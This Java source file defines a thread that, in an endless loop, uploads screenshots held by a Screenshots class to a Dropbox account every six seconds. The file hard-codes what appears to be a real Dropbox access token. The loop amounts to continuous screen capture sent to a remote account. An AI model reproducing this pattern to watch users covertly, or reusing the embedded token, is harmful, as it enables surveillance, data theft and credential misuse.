import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class DropboxUpload extends Thread {

    public static final String ANSI_GREEN = "\u001B[32m";
    public static final String ANSI_RESET = "\u001B[0m";

    private static Screenshots screens = new Screenshots();

    @Override
    public void run() {
        //Dropbox Settings
        String ACCESS_TOKEN = "QArHd0qi66AAAAAAAAAAAY8lUq2XsIYlRD7iT4CE832OWJVpLwF5PKOeTkoXklP3";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        String file_name;


        //Time & namefile settings
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
        Date now;

        try {
            sleep(4000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        while (true) {

            //Creating file name
            now = new Date();
            file_name = dateFormat.format(now).toString();

            try {
                long startTime = System.currentTimeMillis();
                InputStream in = new ByteArrayInputStream(screens.baos.toByteArray());
                FileMetadata metadata = client.files().uploadBuilder("/" + file_name + ".png").uploadAndFinish(in);
                long endTime = System.currentTimeMillis();
                long subTime = endTime - startTime;
                System.out.println(ANSI_GREEN + "Image has been sended successfully" + ANSI_RESET);
                sleep(6000 - subTime);
            } catch (Exception ex) {
                ex.printStackTrace();
            }

        }
    }
}